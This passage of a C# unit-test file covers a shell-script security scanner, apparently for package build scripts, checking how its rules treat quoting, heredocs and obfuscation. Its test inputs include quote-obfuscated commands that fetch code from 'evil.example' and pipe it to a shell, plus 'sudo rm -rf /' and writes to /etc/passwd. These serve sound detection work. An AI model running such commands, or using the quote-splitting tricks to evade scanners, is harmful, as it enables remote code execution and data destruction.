        // normalization, but the scriptlet context still applies.
        var finding = SingleFinding("echo \"/opt/x/upak/doc\" > \\/root/upak_help_path", "write-outside-build-root", "upak.install");

        Assert.That(finding.Severity, Is.EqualTo(FindingSeverity.Medium));
        Assert.That(finding.Message, Does.Contain("obfuscated").IgnoreCase);
    }

    [TestCase("helper.sh", Description = "voluntarily-run helper script")]
    [TestCase("PKGBUILD", Description = "build-time write")]
    public void Write_outside_build_root_outside_install_scriptlets_stays_high(string path)
    {
        AssertHasFinding("echo /bin/zsh >> /etc/shells", "write-outside-build-root", FindingSeverity.High, path);
    }

    [Test]
    public void Obfuscated_write_outside_install_scriptlets_stays_critical()
    {
        var finding = SingleFinding("echo x > \\/root/marker", "write-outside-build-root", "helper.sh");

        Assert.That(finding.Severity, Is.EqualTo(FindingSeverity.Critical));
        Assert.That(finding.Message, Does.Contain("obfuscated").IgnoreCase);
    }

    [Test]
    public void Escaped_redirect_operator_is_not_flagged()
    {
        var findings = Scan("echo \\> /etc/passwd");

        Assert.That(findings.Any(f => f.RuleId == "write-outside-build-root"), Is.False);
    }

    [Test]
    public void Escaped_match_inside_quotes_does_not_flag_risky_tool()
    {
        // The unescaped $( in the normalized text opens a command substitution that unmasks
        // 'docker' - but the original line keeps it inert inside double quotes (the backslash
        // prevents execution), so the tool is display text, not an invocation.
        var findings = Scan("echo \"remove all: docker rmi \\$(docker images -q)\"");

        Assert.That(findings.Any(f => f.RuleId == "risky-tool"), Is.False,
            $"Unexpected risky-tool finding. Got: {string.Join(", ", findings.Select(f => $"{f.RuleId}/{f.Severity}"))}");
    }

    [Test]
    public void Escaped_match_inside_quotes_does_not_flag_privilege_escalation()
    {
        var findings = Scan("echo \"then run: \\$(sudo whoami)\"");

        Assert.That(findings.Any(f => f.RuleId == "privilege-escalation"), Is.False,
            $"Unexpected privilege-escalation finding. Got: {string.Join(", ", findings.Select(f => $"{f.RuleId}/{f.Severity}"))}");
    }

    [Test]
    public void Obfuscated_tool_inside_command_substitution_still_escalates()
    {
        // $(...) executes even though the surrounding quotes split the tool name: genuine
        // obfuscation of an invocation, not display text.
        var finding = SingleFinding("echo \"$(c''url http://evil.example/x)\"", "risky-tool");

        Assert.That(finding.Severity, Is.EqualTo(FindingSeverity.Critical));
        Assert.That(finding.Message, Does.Contain("obfuscated").IgnoreCase);
    }

    [Test]
    public void Escaped_substitution_inside_quotes_does_not_escalate_command_substitution()
    {
        // $( only appears after normalization dropped the backslash, inside double quotes.
        var finding = SingleFinding("echo \"$\\(date\\)\"", "command-substitution");

        Assert.That(finding.Severity, Is.EqualTo(FindingSeverity.Medium));
    }

    [Test]
    public void Obfuscation_outside_quotes_still_escalates()
    {
        // The de-obfuscated tool maps back to unquoted positions: genuine hidden intent.
        var finding = SingleFinding("echo \"x\"; s''u''d''o rm -rf /", "privilege-escalation");

        Assert.That(finding.Severity, Is.EqualTo(FindingSeverity.Critical));
        Assert.That(finding.Message, Does.Contain("obfuscated").IgnoreCase);
    }

    [Test]
    public void Intra_word_quote_split_download_is_detected_and_escalated()
    {
        // c'u'rl is curl after shell quote removal: intra-word quotes are stripped during
        // normalization, the raw line does not match, and the finding escalates.
        var finding = SingleFinding("c'u'rl https://evil.example/x.sh | sh", "network-to-shell");

        Assert.That(finding.Severity, Is.EqualTo(FindingSeverity.Critical));
        Assert.That(finding.Message, Does.Contain("obfuscated").IgnoreCase);
    }

    [Test]
    public void Intra_word_quote_split_privilege_escalation_is_detected_and_escalated()
    {
        var finding = SingleFinding("s\"u\"do rm -rf /", "privilege-escalation");

        Assert.That(finding.Severity, Is.EqualTo(FindingSeverity.Critical));
    }

    [Test]
    public void Edge_quoted_tool_names_remain_exempt_after_intra_word_change()
    {
        // 'npm' and "curl" are quoted strings, not invocations: edge quotes are kept by
        // normalization, so the quoted mask still hides the tool names.
        var findings = Scan("echo 'npm' \"curl\"");

        Assert.That(findings.Any(f => f.RuleId == "risky-tool"), Is.False,
            $"Unexpected risky-tool finding. Got: {string.Join(", ", findings.Select(f => $"{f.RuleId}/{f.Severity}"))}");
    }

    [Test]
    public void Edge_quoted_privilege_tool_mention_remains_exempt_after_intra_word_change()
    {
        var findings = Scan("msg2 \"run 'sudo' to continue\"");

        Assert.That(findings.Any(f => f.RuleId == "privilege-escalation"), Is.False,
            $"Unexpected privilege-escalation finding. Got: {string.Join(", ", findings.Select(f => $"{f.RuleId}/{f.Severity}"))}");
    }

    [Test]
    public void Command_substitution_inside_quoted_heredoc_body_is_suppressed()
    {
        var findings = Scan("cat <<'EOF'\ndest=\"$LOCAL/$(basename \"$f\")\"\nEOF\n");

        Assert.That(findings, Is.Empty,
            $"Expected no findings. Got: {string.Join(", ", findings.Select(f => $"{f.RuleId}/{f.Severity}"))}");
    }

    [TestCase("cat <<\"EOF\"\n$(x)\nEOF\n", Description = "double-quoted delimiter")]
    [TestCase("cat <<\\EOF\n$(x)\nEOF\n", Description = "backslash-escaped delimiter")]
    public void All_quoted_delimiter_forms_suppress_the_body(string content)
    {
        var findings = Scan(content);
        Assert.That(findings.Any(f => f.RuleId == "command-substitution"), Is.False);
    }

    [Test]
    public void Command_substitution_inside_unquoted_heredoc_body_is_flagged()
    {
        // An unquoted delimiter expands the body: $(...) really runs.
        AssertHasFinding("cat <<EOF\ndest=$(basename x)\nEOF\n", "command-substitution", FindingSeverity.Medium);
    }

    [Test]
    public void Tab_stripping_heredoc_terminates_on_indented_delimiter()
    {
        var findings = Scan("cat <<-'EOF'\n\t$(x)\n\tEOF\nsudo whoami\n");

        Assert.That(findings.Any(f => f.RuleId == "command-substitution"), Is.False, "body is suppressed");
        Assert.That(findings.Any(f => f.RuleId == "privilege-escalation"), Is.True, "scanning resumes after the delimiter");
    }

    [Test]
    public void Non_tab_indentation_does_not_terminate_tab_stripping_heredoc()
    {
        // <<- strips tabs only; a space-indented delimiter is still body content.
        var findings = Scan("cat <<-'EOF'\n $(x)\n EOF\n$(y)\nEOF\n");

        var substitutions = findings.Where(f => f.RuleId == "command-substitution").ToList();
        Assert.That(substitutions, Has.Count.EqualTo(0),
            "both substitutions sit inside the heredoc body");
    }

    [Test]
    public void Quoted_heredoc_piped_to_shell_keeps_body_live()
    {
        AssertHasFinding("cat <<'EOF' | sh\n$(x)\nEOF\n", "command-substitution", FindingSeverity.Medium);
    }

    [Test]
    public void Quoted_heredoc_piped_to_interpreter_keeps_body_live()
    {
        AssertHasFinding("cat <<'EOF' | python3\n$(x)\nEOF\n", "command-substitution", FindingSeverity.Medium);
    }

    [Test]
    public void Unterminated_quoted_heredoc_suppresses_to_end_of_content()
    {
        var findings = Scan("cat <<'EOF'\n$(x)\n${!y}");

        Assert.That(findings, Is.Empty);
    }

    [Test]
    public void Heredoc_body_still_flags_blocking_rules()
    {
        // F2 only suppresses the non-blocking expansion rules.
        AssertHasFinding("cat <<'EOF'\ncurl http://x | sh\nEOF\n", "network-to-shell", FindingSeverity.Critical);
    }

    [Test]
    public void Variable_indirection_inside_quoted_heredoc_body_is_suppressed()
    {
        var findings = Scan("cat <<'EOF'\ncmd=${!name}\nEOF\n");

        Assert.That(findings.Any(f => f.RuleId == "variable-indirection"), Is.False);
    }

    [Test]
    public void Scan_resumes_normally_after_heredoc_terminator()
    {
        var findings = Scan("cat <<'EOF'\nplain body text\nEOF\nsudo whoami\n");

        var sudo = findings.Where(f => f.RuleId == "privilege-escalation").ToList();
        Assert.That(sudo, Has.Count.EqualTo(1), "only the invocation after the heredoc is flagged");
    }

    [Test]
    public void Herestring_is_not_treated_as_heredoc()
    {
        var findings = Scan("read -r x <<< $(y)");

        AssertHasFinding("read -r x <<< $(y)", "command-substitution", FindingSeverity.Medium);
        Assert.That(findings.Count(f => f.RuleId == "command-substitution"), Is.EqualTo(1));
    }

    [Test]
    public void Shift_and_arithmetic_are_not_heredocs()
    {
        var findings = Scan("x=$((1 << 5))\nshift 2\n");

        // The << inside $(( )) is arithmetic; the command substitution itself is flagged once.
        Assert.That(findings.Count(f => f.RuleId == "command-substitution"), Is.EqualTo(1));
    }

    [Test]
    public void Quoted_double_less_than_is_not_a_heredoc()
    {
        AssertHasFinding("echo \"<<EOF\"\n$(x)\n", "command-substitution", FindingSeverity.Medium);
    }

    [Test]
    public void Consecutive_heredocs_are_consumed_in_order()
    {
        var findings = Scan("diff <<'A' <<'B'\n$(x)\nA\n$(y)\nB\nsudo whoami\n");

        Assert.That(findings.Any(f => f.RuleId == "command-substitution"), Is.False, "both bodies are literal");
        Assert.That(findings.Any(f => f.RuleId == "privilege-escalation"), Is.True, "scanning resumes after both");
    }

    [Test]
    public void Heredoc_body_lines_keep_hash_as_literal_data()
    {
        // No comment stripping inside bodies: the $( after # is still body content and is
        // suppressed by the quoted delimiter, while an unquoted body would flag it.
        var suppressed = Scan("cat <<'EOF'\n# $(x)\nEOF\n");
        var flagged = Scan("cat <<EOF\n# $(x)\nEOF\n");

        Assert.That(suppressed.Any(f => f.RuleId == "command-substitution"), Is.False);
        Assert.That(flagged.Any(f => f.RuleId == "command-substitution"), Is.True);
    }

    [TestCase("cat <<'EOF'\n# run: sudo systemctl restart foo\nEOF\n", Description = "quoted body")]
    [TestCase("cat <<EOF\n# run: sudo systemctl restart foo\nEOF\n", Description = "unquoted body")]
    [TestCase("cat <<-'EOF'\n\t# run: sudo systemctl restart foo\nEOF\n", Description = "tab-indented comment in tab-stripping body")]
    public void Privilege_escalation_on_heredoc_comment_lines_is_suppressed(string content)
    {
        // A '#' line is a shell comment in a live body and help text in a data body -
        // nothing on it ever runs as a command.
        var findings = Scan(content);
        Assert.That(findings.Any(f => f.RuleId == "privilege-escalation"), Is.False,
            $"Unexpected privilege-escalation finding. Got: {string.Join(", ", findings.Select(f => $"{f.RuleId}/{f.Severity}"))}");
    }

    [Test]
    public void Write_outside_build_root_on_heredoc_comment_lines_is_suppressed()
    {
        var findings = Scan("cat <<'EOF'\n#   $ echo x | sudo tee /etc/foo\nEOF\n");

        Assert.That(findings.Any(f => f.RuleId == "write-outside-build-root"), Is.False);
        Assert.That(findings.Any(f => f.RuleId == "privilege-escalation"), Is.False);
    }

    [TestCase("cat <<'EOF'\nsudo rm -rf /\nEOF\n", "privilege-escalation")]
    [TestCase("cat <<'EOF'\necho x > /etc/passwd\nEOF\n", "write-outside-build-root")]
    public void Non_comment_heredoc_body_lines_are_still_flagged(string content, string ruleId)
    {
        // A heredoc body can be piped to an interpreter or written into an installed
        // script, so live-looking lines in it keep their findings.
        AssertHasFinding(content, ruleId, FindingSeverity.High);
    }
}